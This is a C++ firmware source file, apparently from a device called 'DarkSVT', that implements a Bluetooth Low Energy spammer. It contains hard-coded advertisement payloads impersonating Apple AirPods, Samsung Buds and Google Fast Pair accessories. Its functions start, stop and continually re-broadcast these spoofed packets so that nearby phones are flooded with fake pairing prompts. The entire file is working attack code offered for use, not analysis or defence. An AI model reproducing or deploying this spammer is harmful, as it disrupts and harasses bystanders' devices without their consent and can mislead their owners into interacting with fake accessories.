#include "ble_spammer.h"
#include "../core/display.h"

bool bleSpamActive = false;
int bleSpamMode = 0;
static NimBLEAdvertising* pAdvertising = nullptr;

// Apple AirPods advertisement data
static uint8_t airpodsAdv[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Samsung Buds
static uint8_t samsungAdv[] = {
    0x1E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
    0x14, 0x15, 0x03, 0x21, 0x01, 0x00, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Google Fast Pair
static uint8_t googleAdv[] = {
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00
};

void initBLESpammer() {
    NimBLEDevice::init("DarkSVT");
    pAdvertising = NimBLEDevice::getAdvertising();
}

void startBLESpam(int mode) {
    bleSpamMode = mode;
    bleSpamActive = true;
    if (mode == 0) {
        pAdvertising->setManufacturerData(std::string((char*)airpodsAdv, sizeof(airpodsAdv)));
    } else if (mode == 1) {
        pAdvertising->setManufacturerData(std::string((char*)samsungAdv, sizeof(samsungAdv)));
    } else if (mode == 2) {
        pAdvertising->setManufacturerData(std::string((char*)googleAdv, sizeof(googleAdv)));
    }
    pAdvertising->start();
    showMsg("BLE SPAM STARTED", C_OK);
}

void stopBLESpam() {
    bleSpamActive = false;
    if (pAdvertising) pAdvertising->stop();
    showMsg("BLE SPAM STOPPED", C_INFO);
}

void runBLESpamLoop() {
    if (!bleSpamActive || !pAdvertising) return;
    NimBLEDevice::deinit(true);
    delay(100);
    NimBLEDevice::init("DarkSVT");
    pAdvertising = NimBLEDevice::getAdvertising();
    if (bleSpamMode == 0) {
        pAdvertising->setManufacturerData(std::string((char*)airpodsAdv, sizeof(airpodsAdv)));
    } else if (bleSpamMode == 1) {
        pAdvertising->setManufacturerData(std::string((char*)samsungAdv, sizeof(samsungAdv)));
    } else {
        pAdvertising->setManufacturerData(std::string((char*)googleAdv, sizeof(googleAdv)));
    }
    pAdvertising->start();
    delay(200);
}
